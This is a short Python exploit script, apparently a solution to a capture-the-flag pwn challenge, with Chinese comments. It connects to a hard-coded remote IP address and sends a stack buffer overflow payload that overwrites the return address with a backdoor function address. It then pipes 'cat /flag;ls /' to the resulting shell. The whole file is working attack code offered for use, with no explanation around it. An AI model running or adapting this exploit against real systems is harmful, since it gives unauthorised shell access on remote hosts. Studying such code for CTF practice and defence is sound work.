
import socket
import struct
import sys
import time

HOST = "103.163.47.230"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 33608
BACKDOOR = 0x080498F5          # 远程实测后门地址（附件里是 0x080491c6，远程无效）
CMD = b"cat /flag;ls /\n"      # 会跟在 32 字节 payload 后面被 /bin/sh 读到


def p32(x):
    return struct.pack("<I", x)


def exploit(port=PORT, cmd=CMD, verbose=True):
    s = socket.create_connection((HOST, port), timeout=10)
    s.settimeout(1.0)
    try:                                    # 收 banner + "小路没人看，走起~"
        while True:
            if not s.recv(4096):
                break
    except socket.timeout:
        pass

    payload = b"A" * 0x18 + b"B" * 4 + p32(BACKDOOR) + cmd
    s.sendall(payload)                      # 必须整包一次发

    time.sleep(1.0)
    out = b""
    s.settimeout(2.5)
    try:
        while True:
            c = s.recv(8192)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    s.close()
    if verbose:
        sys.stdout.write(out.decode("utf-8", "replace"))
    return out


if __name__ == "__main__":
    exploit()
